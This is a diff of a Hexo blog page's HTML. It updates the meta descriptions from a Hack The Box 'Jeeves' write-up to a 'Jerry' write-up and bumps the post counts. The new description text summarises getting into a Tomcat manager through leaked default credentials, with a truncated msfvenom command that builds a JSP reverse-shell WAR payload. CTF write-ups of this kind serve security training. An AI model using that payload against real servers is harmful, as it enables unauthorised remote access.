@@ -6,24 +6,22 @@
   <meta name="keywords" content=" 博客 , htb ">
   <meta name="description" content="htb之Lazy | Hexo">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="htb之Jeevesnmap 收集信息发现开启有80和50000端口，打开80端口，只看见一个搜索框，随便输入几个字符，直接跳出一张图片错误的引导信息，直接去看50000端口还是有点东西的，直接爆破目录爆破出这几个目录，打开可以看到是一个名为jenkins的项目直接去Google找漏洞https://www.hackingarticles.in/exploiting-jenkins-groovy-">
+<meta name="description" content="htb之jerrynmap 收集信息只开有一个8080端口，发现是一个刚安装好的tomcat，这个漏洞以前遇到过输错几次默认密码之后，后面报错信息直接把账号密码报出来了直接进入到tomcat管理后台，看到有一个上传点，直接使用msfvenom生成一个shell  msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war &amp;gt; she">
 <meta name="keywords" content="博客,htb">
 <meta property="og:type" content="article">
-<meta property="og:title" content="htb之Jeeves">
-<meta property="og:url" content="https://manmachines.github.io/2019/11/20/htb之Jeeves/index.html">
+<meta property="og:title" content="htb之jerry">
+<meta property="og:url" content="https://manmachines.github.io/2019/11/20/htb之jerry/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="htb之Jeevesnmap 收集信息发现开启有80和50000端口，打开80端口，只看见一个搜索框，随便输入几个字符，直接跳出一张图片错误的引导信息，直接去看50000端口还是有点东西的，直接爆破目录爆破出这几个目录，打开可以看到是一个名为jenkins的项目直接去Google找漏洞https://www.hackingarticles.in/exploiting-jenkins-groovy-">
+<meta property="og:description" content="htb之jerrynmap 收集信息只开有一个8080端口，发现是一个刚安装好的tomcat，这个漏洞以前遇到过输错几次默认密码之后，后面报错信息直接把账号密码报出来了直接进入到tomcat管理后台，看到有一个上传点，直接使用msfvenom生成一个shell  msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war &amp;gt; she">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="https://manmachines.github.io/images/jeeves/1.png">
-<meta property="og:image" content="https://manmachines.github.io/images/jeeves/2.png">
-<meta property="og:image" content="https://manmachines.github.io/images/jeeves/3.png">
-<meta property="og:image" content="https://manmachines.github.io/images/jeeves/4.png">
-<meta property="og:image" content="https://manmachines.github.io/images/jeeves/5.png">
-<meta property="og:updated_time" content="2019-11-20T07:11:49.000Z">
+<meta property="og:image" content="https://manmachines.github.io/images/jerry/1.png">
+<meta property="og:image" content="https://manmachines.github.io/images/jerry/2.png">
+<meta property="og:image" content="https://manmachines.github.io/images/jerry/3.png">
+<meta property="og:updated_time" content="2019-11-20T08:11:00.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="htb之Jeeves">
-<meta name="twitter:description" content="htb之Jeevesnmap 收集信息发现开启有80和50000端口，打开80端口，只看见一个搜索框，随便输入几个字符，直接跳出一张图片错误的引导信息，直接去看50000端口还是有点东西的，直接爆破目录爆破出这几个目录，打开可以看到是一个名为jenkins的项目直接去Google找漏洞https://www.hackingarticles.in/exploiting-jenkins-groovy-">
-<meta name="twitter:image" content="https://manmachines.github.io/images/jeeves/1.png">
+<meta name="twitter:title" content="htb之jerry">
+<meta name="twitter:description" content="htb之jerrynmap 收集信息只开有一个8080端口，发现是一个刚安装好的tomcat，这个漏洞以前遇到过输错几次默认密码之后，后面报错信息直接把账号密码报出来了直接进入到tomcat管理后台，看到有一个上传点，直接使用msfvenom生成一个shell  msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war &amp;gt; she">
+<meta name="twitter:image" content="https://manmachines.github.io/images/jerry/1.png">
 
 
 <link rel="icon" href="/img/avatar.jpg">
@@ -96,11 +94,11 @@
 
 
 <ul>
-    <li><div class="all active">全部文章<small>(13)</small></div></li>
+    <li><div class="all active">全部文章<small>(14)</small></div></li>
     
         
             
-            <li><div data-rel="渗透笔记">渗透笔记<small>(10)</small></div>
+            <li><div data-rel="渗透笔记">渗透笔记<small>(11)</small></div>
                 
             </li>
             
@@ -132,7 +130,7 @@
     </div>
     <div><a class="about  hasFriend  site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="13">
+<input type="hidden" id="yelog_site_posts_number" value="14">
 
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
@@ -228,6 +226,14 @@
            data-author="" >
             <span class="post-title" title="htb之Jeeves">htb之Jeeves</span>
             <span class="post-date" title="2019-11-20 14:33:51">2019/11/20</span>
+        </a>
+        
+        <a  class="渗透笔记 "
+           href="/2019/11/21/htb之Nibbles/"
+           data-tag="博客,htb"
+           data-author="" >
+            <span class="post-title" title="htb之Nibbles">htb之Nibbles</span>
+            <span class="post-date" title="2019-11-21 15:08:45">2019/11/21</span>
         </a>
         
         <a  class="渗透笔记 "
